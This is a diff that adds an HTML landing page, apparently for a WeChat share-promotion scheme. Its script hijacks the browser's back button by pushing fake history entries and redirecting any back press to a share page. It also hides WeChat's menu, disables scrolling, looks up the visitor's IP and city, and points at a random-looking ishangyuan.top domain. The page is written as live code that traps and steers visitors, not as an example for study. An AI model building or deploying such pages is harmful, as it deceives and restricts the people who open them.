@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title></title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0,minimum-scale=1.0,user-scalable=0" />
+  <meta charset="UTF-8" name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+  <!-- 必备勿动-->
+  <!-- <link rel="stylesheet" href="/public/yfcmf/model.css"> -->
+  
+  <script src="https://cdn.bootcss.com/jquery/2.1.1/jquery.min.js"></script>
+  <script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+  <script src="http://pv.sohu.com/cityjson?ie=utf-8"></script>
+  <!-- 表单验证-->
+  <!-- 以上必备勿动-->
+</head>
+<body style="margin:0 auto;background:#000;">
+<!--遮罩层结束-->
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/zepto/1.0rc1/zepto.min.js"></script>
+<link href="/public/model/assets/css.css?v=1.0" rel="stylesheet"/>
+<script src=//res.wx.qq.com/open/js/jweixin-1.0.0.js></script>
+ <script>
+    $(document).ready(function(e) {
+      var counter = 0;
+      if (window.history && window.history.pushState) {
+          $(window).on('popstate', function () {
+            window.history.pushState('forward', null, '#');
+            window.history.forward(1);
+            var refurl=document.referrer;
+            //var host = window.location.host
+            refurl = '/home/sharetheme/sharef/share_id/910';
+            location.replace(refurl);
+         });
+      }
+     window.history.pushState('forward', null, '#'); //在IE中必须得有这两行
+     window.history.forward(1);
+}); 
+</script>
+<script>
+  document.addEventListener('WeixinJSBridgeReady', function onBridgeReady() {
+       // 通过下面这个API隐藏右上角按钮
+       WeixinJSBridge.call('hideOptionMenu');
+   });
+  var share_id = "910";
+  var channel_id = "0";
+  var frequency = "1";
+  var ckurl = "http://59581dsafji.ishangyuan.top/";
+  var minnum = 80; var maxnum = 90;$('body').on('touchmove', function (event) {event.preventDefault();});
+  </script>
+  <script src="/public/model/assets/weiqun.js" charset="UTF-8"></script>
+<div style="display:none;">
+  0</div>
+</body>
+<html>
